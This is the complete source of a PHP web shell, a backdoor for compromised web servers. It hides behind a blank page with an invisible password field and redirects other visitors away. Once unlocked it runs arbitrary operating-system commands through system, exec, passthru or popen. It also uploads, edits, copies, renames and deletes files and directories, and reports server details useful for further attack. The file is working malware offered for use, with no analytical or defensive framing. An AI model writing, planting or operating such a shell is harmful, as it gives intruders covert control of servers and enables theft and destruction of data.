<?php
session_start();
error_reporting(0);
$GLOBALS['pass'] = "33a494aa359716544b348d096389fe5e85d61828";
function auth(){
		if(isset($GLOBALS['pass']) && (trim($GLOBALS['pass'])!='')){
			$c = $_COOKIE;
			$p = $_POST;
			if(isset($p['pass'])){
				$your_pass = sha1(md5($p['pass']));
				if($your_pass==$GLOBALS['pass']){
					setcookie("pass", $your_pass, time()+36000, "/");
					header("Location: ".get_self());
				}
			} elseif  (!isset($_REQUEST['param'])) {
				header("Location: /");
			}
		if(!isset($c['pass']) || ((isset($c['pass'])&&($c['pass']!=$GLOBALS['pass'])))){
		$res = "<!doctype html>
		<html>
		<head>
		<meta charset='utf-8'>
		<meta name='robots' content='noindex, nofollow, noarchive'>
		<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0'>
		</head>
		<style>
		  body {
			background-color: #FFFFFF;
		  }
		  input {
			border-top-style: hidden;
			border-right-style: hidden;
			border-left-style: hidden;
			border-bottom-style: hidden;
			background-color: #FFFFFF;
		  }
		</style>
		<script type='text/javascript'>
		var d = document;
		d.write(\"<form method='post'><input type='password' id='pass' name='pass'></form>\");
		d.getElementById('pass').focus();
		d.getElementById('pass').setAttribute('autocomplete', 'off');
		</script>
		</body></html>
		";
				echo $res;
				die();
			}
		}
}
auth();
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
$slash="\\";
}else{
$slash="/";
}
if ($_REQUEST['address']){
if(is_readable($_REQUEST['address'])){
chdir($_REQUEST['address']);}}

$me=$_SERVER['PHP_SELF']."?param&";
$formp="<form method=post action='".$me."'>";
$nowaddress='<input type=hidden name=address value="'.getcwd().'">';
if ($_FILES["filee"] and ! $_FILES["filee"]["error"]) {
   move_uploaded_file($_FILES["filee"]["tmp_name"], $_FILES["filee"]["name"]);
   $ifupload="Uploaded";
}
$head='<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
</head><body  topmargin="0" leftmargin="0" rightmargin="0" 
bgcolor="#f2f2f2"><div align="center">
&nbsp;<table border="1" width="1000" height="14" bordercolor="#CDCDCD" style="border-collapse: collapse; border-style: solid; border-width: 1px">
<tr>
<td height="14" width="996">
<p align="center"><font face="Tahoma" style="font-size: 9pt"><span lang="en-us"><a href="?param&do=filemanger">File 
Manger</a> -- <a href="?param&do=com">Command Execute</a> -- <a href="?param&do=info">
Server Information</a></span></font></td></tr></table></div>
<div align="center">
<table id="table2" style="border-collapse: collapse; border-style: 
solid;" width="1000" bgcolor="#eaeaea" border="1" bordercolor="#c6c6c6" 
cellpadding="0"><tbody><tr><td><div align="center"><table id="table3" style="border-style:dashed; border-width:1px; margin-top: 20px; margin-bottom: 20px; 
border-collapse: collapse" width="950" border="1" bordercolor="#cdcdcd"
 height="620" bordercolorlight="#CDCDCD" bordercolordark="#CDCDCD"><tbody><tr>
<td style="border: 1px solid rgb(198, 198, 198);" 
width="950" bgcolor="#e7e3de" height="590" valign="top">';
$end='<p align="center">&nbsp;</td></tr></tbody></table></div></td></tr><tr><td bgcolor="#c6c6c6"><p style="margin-top: 0pt; margin-bottom: 0pt" align="center"><span lang="en-us"></span></td></tr></tbody></table></div></body></html>';
$deny=$head."<p align='center'> Permission Denied".$end;
if ($_GET['do']=="edit" && $_GET['filename']!="dir"){
if(is_readable($_GET['address'].$_GET['filename'])){
$opedit=fopen($_GET['address'].$_GET['filename'],"r");
while(!feof($opedit))
$data.=fread($opedit,9999);
fclose($opedit); 
echo $head.$formp.$nowaddress.'<p align="center">File Name : '.$_GET['address'].$_GET['filename'].'<br><textarea rows="19" name="fedit" cols="87">'.htmlspecialchars("$data", ENT_QUOTES).'</textarea><br><input value="'.$_GET['filename'].'" name=namefe><br><input type=submit value="Save"></form></p>'.$end;exit;
}else{echo $deny;exit;}}
function sizee($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
function deleteDirectory($dir) {
if (!file_exists($dir)) return true;
if (!is_dir($dir) || is_link($dir)) return unlink($dir);
foreach (scandir($dir) as $item) {
if ($item == '.' || $item == '..') continue;
if (!deleteDirectory($dir . "/" . $item)) {
chmod($dir . "/" . $item, 0777);
if (!deleteDirectory($dir . "/" . $item)) return false;
};}return rmdir($dir);}
if($_GET['do']=="rename"){
echo $head.$formp.$nowaddress.'<p align="center"><input value='.$_GET['filename'].'><input type=hidden name=addressren value='.$_GET['address'].$_GET['filename'].'> To <input name=nameren><br><input type=submit value="  Save  "></form></p>'.$end;exit;
}
if ($_REQUEST['cdirname']){
if(is_writable($_REQUEST['address'])){
mkdir($_REQUEST['address'].$slash.$_REQUEST['cdirname'],"0777");}else{echo $deny;exit;}}


if ($_REQUEST['copyname'] && $_REQUEST['cpyto']){
copy($_REQUEST['copyname'],$_REQUEST['cpyto']);
}


if($_POST['nameren'] && $_POST['addressren']){
if(is_writable($_REQUEST['addressren'])){

rename($_POST['addressren'],$_POST['nameren']);}else{echo $deny;exit;}
}


if($_GET['do']=="delete"){
if ($_GET['type']=="dir"){
if(is_writable($_REQUEST['address'])){
$dir=$_GET['address'].$_GET['filename'];
deleteDirectory($dir);
}else{echo $deny;exit;}
}elseif($_GET['type']=="file"){
if(is_writable($_GET['address'].$_GET['filename'])){
unlink($_GET['address'].$_GET['filename']);}else{echo $deny;exit;}	
}
}


if($_POST['fedit'] && $_POST['namefe']){

if(is_writable($_REQUEST['address'])){

$opensave=fopen($_POST['address'].$slash.$_POST['namefe'],"w");
fwrite($opensave,$_POST['fedit']);
fclose($opensave);}else{echo $deny;exit;}
}

if($_GET['do']=="info"){
if(ini_get('safe_mode')){
$safe_modes="On";
}else{
$safe_modes="Off";
}
if(ini_get('disable_functions')){
$disablef=ini_get('disable_functions');
}else{
$disablef="All Functions Enable";
}
if(ini_get('register_globals')){
$registerg="Enable";
}else{
$registerg="disable";
}
if(extension_loaded('curl')){
$curls="Enable";
}else{
$curls="disable";
}
if(@function_exists('mysql_connect')){
$db_on = "Mysql : On";
};
if(@function_exists('mssql_connect')){
$db_on = "Mssql : On";
};
if(@function_exists('pg_connect')){
$db_on = "PostgreSQL : On";
};if(@function_exists('ocilogon')){
$db_on = "Oracle : On";
};

echo $head."<font face='Tahoma' size='2'>Operating System : ".php_uname()."<br>Server Name : ".$_SERVER['HTTP_HOST']."<br>Disable_Functions : ".$disablef."<br>Safe_Mode : ".$safe_modes."<br>Openbase_dir : ".ini_get('openbase_dir')."<br>Php Version : ".phpversion()."<br>Free Space : ".sizee(disk_free_space("/"))."<br>Total Space : ".sizee(disk_total_space("/"))."<br>Register_Globals : ".$registerg."<br>Curl : ".$curls."<br>Database ".$db_on."<br>Server Name : ".$_SERVER['HTTP_HOST']."<br>Admin Server : ".$_SERVER['SERVER_ADMIN'].$end;
exit;
}
if ($_GET['do']=="com"){
echo $head.'
<form method=post >
<p align="center">
<textarea rows="19" name="S1" cols="87">';if (strlen($_POST['cm'])>1 && $_POST['comex']!="popen"){
echo $_POST['comex']($_POST['cm']);}
if (strlen($_POST['cm'])>1 && $_POST['comex']=="popen"){
popen($_POST['cm'],"r");}

echo'</textarea></p><p align="center">
<input type=hidden name="?param&do" size="50" value="com"> <input type="text" name="cm" size="50"><select name=comex>
  <option value="system">System</option>  <option value="exec">Exec</option>  <option value="passthru">Passthru</option><option value="popen">popen</option>
</select><input type="submit" value="eXecute">
</p></form>'.$end;exit;}


if($_GET['do']=="edit"){
if($_GET['filename']=="dir"){
if(is_readable($_GET['address'].$_GET['filew'])){
chdir($_GET['address'].$_GET['filew']);}else{echo $deny;exit;}

}}
$araddresss=explode($slash,getcwd());
$matharrayy=count($araddresss)-1;
$addr1backk=str_replace($araddresss[$matharrayy],"",$araddresss);
for($countback=0;$countback<count($addr1backk);$countback++){
$arraybacke[$countback]=$slash.$addr1backk[$countback];
$backdirunixx=$backdirunixx.$slash.$addr1backk[$countback];
}
if ($slash=="\\"){
$countback=null;
$backdirwin=null;
for($countback=1;$countback<count($addr1backk);$countback++){
$backdirwin=$backdirwin."\\".$addr1backk[$countback];}
$backdirwin=$addr1backk[0].$backdirwin;
$backaddresss=$backdirwin;
}else{
$countback=null;
$backdirwin=null;
for($countback=1;$countback<count($addr1backk);$countback++){
$backdirwin=$backdirwin."/".$addr1backk[$countback];}
$backdirwin=$addr1backk[0].$backdirwin;
$backaddresss=$backdirwin;
var_dump($backaddresss);
$backaddresss=str_replace("\\","/",$backaddresss);
}
function calc_dir_size($path)
{
$size = 0;
if ($handle = opendir($path))
{
while (false !== ($entry = readdir($handle)))
{
$current_path = $path . '/' . $entry;
if ($entry != '.' && $entry != '..' && !is_link($current_path))
{
if (is_file($current_path))
$size += filesize($current_path);
elseif (is_dir($current_path))
$size = calc_dir_size($current_path);
}
}
}
closedir($handle);
return $size;
} 
if ($_GET['address']){$ifget=$_GET['address'];}if($_POST['address']){$ifget=$_POST['address'];}
if($cwd==''){$cwd=getcwd();}$nowaddress='<input type=hidden name=address value="'.$cwd.'">';
$ad=getcwd();
$hand=opendir("$ad");
while (false !== ($fileee = readdir($hand))) {
        if ($fileee != "." && $fileee != "..") {
		if (filetype($fileee)=="dir"){
$fil=$fil.'<table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" width="950" height="20" dir="ltr">
<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"><a href="?param&do=edit&address='.$cwd.$slash.'&filename=dir&filew='.$fileee.'">'.$fileee.'</span></td>
<td valign="top" height="19" width="65"><font face="Tahoma" style="font-size: 9pt">'.date("y/m/d", filectime($fileee)).'</td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"></td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"></td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?param&do=rename&address='.$cwd.$slash.'&filename='.$fileee.'">Ren</a></td>
<td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?param&do=delete&type=dir&address='.$cwd.$slash.'&filename='.$fileee.'">Del</a></td></tr></table>'
;}
else{
$file=$file.'<table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" width="950" height="20" dir="ltr">
<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"><a href="?param&do=edit&address='.$cwd.$slash.'&filename='.$fileee.'">'.$fileee.'</span></td>
<td valign="top" height="19" width="80"><font face="Tahoma" style="font-size: 9pt">'.sizee(filesize($fileee)).'</td><td valign="top" height="19" width="65"><font face="Tahoma" style="font-size: 9pt">'.date("y/m/d", filectime($fileee)).'</td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"></td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?param&do=edit&address='.$cwd.$slash.'&filename='.$fileee.'">Edit</a></td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?param&do=rename&address='.$cwd.$slash.'&filename='.$fileee.'">Ren</a></td>
<td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"><a href="?param&do=delete&type=file&address='.$cwd.$slash.'&filename='.$fileee.'">Del</a></td></tr></table>'
;}
}
}
echo $head.'
<font face="Tahoma" style="font-size: 6pt"><table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" width="950" height="20" dir="ltr">
<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"><font color=#4a7af4>Now Directory : '.$backaddresss.'<br><a href="?param&do=back&address='.$backaddresss.'"><font color=#000000>Back</span></td>
</tr></table>'.$fil.$file.'</table>
<table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5"><tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt; font-weight:700">'.$formp.'Change Directory</font></td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080"><input name=address value='.getcwd().'><input type=submit value="Go"></form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt; font-weight:700">Upload ---&gt; &nbsp;</td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<form action="'.$me.'" method=post enctype=multipart/form-data>'.$nowaddress.'
<font face="Tahoma" style="font-size: 10pt"><input size=40 type=file name=filee > 
<input type=submit value=Upload /><br>'.$ifupload.'</form></td></tr><tr>


<td width="200" align="right" valign="top">
<font face="Tahoma" style="font-size: 10pt">'.$formp.'<b>Copy ----&gt;</b></b>&nbsp;&nbsp;From : </td>
<td width="750"><font face="Tahoma" style="font-size: 10pt">
<input size=40 name=copyname> To  <input size=40 name=cpyto> <input type=submit value =Copy></form></td></tr></table>
<hr></td></tr></tbody></table></div></td></tr><tr><td bgcolor="#c6c6c6">

<hr></td></tr></tbody></table></div></td></tr><tr><td bgcolor="#c6c6c6">
</font></span></td></tr></tbody></table></div></body></html>';